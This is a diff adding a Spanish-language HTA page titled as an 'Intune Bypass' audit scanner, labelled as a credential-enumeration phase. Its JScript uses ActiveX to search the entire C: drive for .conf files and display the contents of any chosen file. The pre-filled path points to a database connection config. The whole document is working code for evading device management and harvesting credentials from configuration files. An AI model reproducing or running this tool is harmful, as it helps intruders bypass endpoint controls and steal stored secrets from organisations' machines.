@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>Escáner de Auditoría Intune Bypass</title>
+<script language="JScript">
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var shell = new ActiveXObject("WScript.Shell");
+
+    function buscarArchivos(ruta) {
+        try {
+            var carpeta = fso.GetFolder(ruta);
+            var archivos = new Enumerator(carpeta.Files);
+            for (; !archivos.atEnd(); archivos.moveNext()) {
+                var archivo = archivos.item();
+                if (archivo.Name.toLowerCase().indexOf(".conf") !== -1) {
+                    document.getElementById("log").value += archivo.Path + "\n";
+                }
+            }
+            var subCarpetas = new Enumerator(carpeta.SubFolders);
+            for (; !subCarpetas.atEnd(); subCarpetas.moveNext()) {
+                buscarArchivos(subCarpetas.item().Path);
+            }
+        } catch(e) { /* Saltar carpetas sin permiso */ }
+    }
+
+    function iniciarEscaneo() {
+        document.getElementById("log").value = "Buscando archivos .conf en C:\\...\n";
+        buscarArchivos("C:\\");
+        document.getElementById("log").value += "\n--- Escaneo Finalizado ---";
+    }
+
+    function leerArchivo() {
+        var path = document.getElementById("filepath").value;
+        try {
+            var f = fso.OpenTextFile(path, 1);
+            alert(f.ReadAll());
+            f.Close();
+        } catch(e) { alert("Error al leer: " + e.message); }
+    }
+</script>
+</head>
+<body style="background:#eee; font-family:sans-serif;">
+    <h3>Fase: Enumeración de Credenciales</h3>
+    <button onclick="iniciarEscaneo()">1. Buscar .conf en todo el Disco</button><br><br>
+    <textarea id="log" style="width:100%; height:150px;"></textarea><br><br>
+    
+    <input type="text" id="filepath" style="width:70%;" value="C:\Services\InternalApp\Config\db_connection.conf">
+    <button onclick="leerArchivo()">2. Leer contenido</button>
+</body>
+</html>
